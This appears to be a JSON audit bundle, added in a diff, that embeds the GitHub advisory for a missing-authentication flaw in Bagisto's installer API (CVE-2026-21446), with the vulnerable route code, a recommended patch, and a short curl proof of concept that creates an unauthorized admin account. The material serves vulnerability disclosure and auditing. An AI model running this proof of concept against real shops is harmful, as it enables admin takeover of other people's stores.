@@ -1,0 +1,60 @@
+{
+ "schema_version": "causal-audit-bundle/1",
+ "class_id": "alias-cae8c11bed31aa07b41bf083",
+ "status_at_selection": "UNANALYZED",
+ "repo": "bagisto/bagisto",
+ "clone_dir": "/home/hanqing/agents/ai-slop/.ai-slop/state/repos/bagisto_bagisto",
+ "clone_url": "https://github.com/bagisto/bagisto.git",
+ "clone_head_sha": "863ec89905ca8b7916dbe9614f1e8b985240f2eb",
+ "clone_shallow": "false",
+ "clone_promisor": true,
+ "clone_partial_filter": "blob:none",
+ "advisory_ids": [
+  "CVE-2026-21446",
+  "GHSA-6h7w-v2xr-mqvw"
+ ],
+ "base_ledger_revision": 1,
+ "ledger_snapshot_sha256": "2a8e0f606d9dbb6a509188d6f4da35598f233dce4b2b205fa1cb14136e75fbe5",
+ "advisory": {
+  "id": "GHSA-6h7w-v2xr-mqvw",
+  "cve_id": "CVE-2026-21446",
+  "summary": "Bagisto Missing Authentication on Installer API Endpoints",
+  "description": "### Vulnerable Code\n\n**File:** `packages/Ibkul/Installer/src/Routes/Ib.php`\n\n```\n<?php\n\nuse Illuminate\\\\Session\\\\Middleware\\\\StartSession;  \nuse Illuminate\\\\Support\\\\Facades\\\\Route;  \nuse Ibkul\\\\Installer\\\\Http\\\\Controllers\\\\InstallerController;\n\nRoute::middleware(\\['Ib', 'installer\\_locale'\\])-\\>group(function () {  \n    Route::controller(InstallerController::class)-\\>group(function () {  \n        Route::get('install', 'index')-\\>name('installer.index');\n\n        Route::middleware(StartSession::class)-\\>prefix('install/api')-\\>group(function () {  \n            Route::post('env-file-setup', 'envFileSetup')-\\>name('installer.env\\_file\\_setup');  \n            Route::post('run-migration', 'runMigration')-\\>name('installer.run\\_migration')-\\>withoutMiddleware('Ib');  \n            Route::post('run-seeder', 'runSeeder')-\\>name('installer.run\\_seeder')-\\>withoutMiddleware('Ib');  \n            Route::get('download-sample', 'downloadSample')-\\>name('installer.download\\_sample')-\\>withoutMiddleware('Ib');  \n            Route::post('admin-config-setup', 'adminConfigSetup')-\\>name('installer.admin\\_config\\_setup')-\\>withoutMiddleware('Ib');  \n            Route::post('sample-products-setup', 'createSampleProducts')-\\>name('installer.sample\\_products\\_setup')-\\>withoutMiddleware('Ib');  \n        });  \n    });  \n});\n```\n\nAPI routes remain active even after initial installation is complete, allowing any unauthenticated attacker to:\n\n- Create admin accounts  \n- Modify application configuration  \n- Potentially overwrite existing data\n\nthe underlying **API endpoints** (`/install/api/*`) are directly accessible and exploitable without any authentication. An attacker can bypass the Ib installer entirely by calling the API endpoints directly.\n\n### How to Reproduce\n\n1. The Ib installer UI at `http://localhost:8000/install` has client-side protections  \n2. **However, the API endpoints are directly exploitable:**  \n   - The attack works by calling `/install/api/admin-config-setup` directly via curl/HTTP client  \n   - No CSRF token, session, or authentication is required  \n   - The Ib UI workflow is completely bypassed\n\n### Proof of Concept\n\n```\n#!/bin/bash\n# PoC: Create admin account without authentication\n\n\nTARGET=\"http://localhost:8000\"\n\n\n# Create a new admin account\ncurl -X POST \"$TARGET/install/api/admin-config-setup\" \\\n    -H \"Content-Type: application/json\" \\\n    -d '{\n        \"admin_name\": \"Attacker\",\n        \"admin_email\": \"attacker@evil.com\",\n        \"admin_password\": \"HackedPassword123\"\n    }'\n\n\necho \"\"\necho \"New admin account created!\"\necho \"Login at: $TARGET/admin\"\necho \"Email: attacker@evil.com\"\n```\n\n### Expected Result\n\nThe API should reject unauthenticated requests with 401/403 status.\n\n### Actual Result\n\nThe API accepts the request and creates a new admin account, allowing full administrative access to the e-commerce platform.\n\n### Recommended Patch\n\nAdd installation completion check\n\n```\n// In InstallerController.php or a new middleware\n\n\npublic function __construct()\n{\n    // Check if application is already installed\n    if (file_exists(base_path('.env')) &&\n        config('app.key') &&\n        \\Schema::hasTable('admins') &&\n        \\DB::table('admins')->count() > 0) {\n        abort(404, 'Application already installed');\n    }\n}\n```",
+  "severity": "high",
+  "cvss": {
+   "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+   "score": 9.8
+  },
+  "cwes": [
+   {
+    "cwe_id": "CWE-306",
+    "name": "Missing Authentication for Critical Function"
+   }
+  ],
+  "published_at": "2026-01-02T21:14:06Z",
+  "updated_at": "2026-01-08T21:35:05Z",
+  "withdrawn_at": null,
+  "vulnerabilities": [
+   {
+    "package": {
+     "ecosystem": "composer",
+     "name": "bagisto/bagisto"
+    },
+    "vulnerable_version_range": ">= 2.3.0, < 2.3.10",
+    "first_patched_version": "2.3.10",
+    "vulnerable_functions": []
+   }
+  ],
+  "references": [
+   "https://github.com/bagisto/bagisto/security/advisories/GHSA-6h7w-v2xr-mqvw",
+   "https://github.com/bagisto/bagisto/commit/380c045e48490da740cd505fb192cc45e1809bed",
+   "https://nvd.nist.gov/vuln/detail/CVE-2026-21446",
+   "https://github.com/advisories/GHSA-6h7w-v2xr-mqvw"
+  ],
+  "source": "https://api.github.com/advisories/GHSA-6H7W-V2XR-MQVW",
+  "fetch_error": null
+ },
+ "same_repository_prior_hits": [],
+ "protocol": "docs/AUDIT-PROTOCOL.md",
+ "context_rule": "One case, one clean context. Do not read the canonical ledger, another case bundle/output, or a prior verdict. Prior hits are leads, never proof."
+}
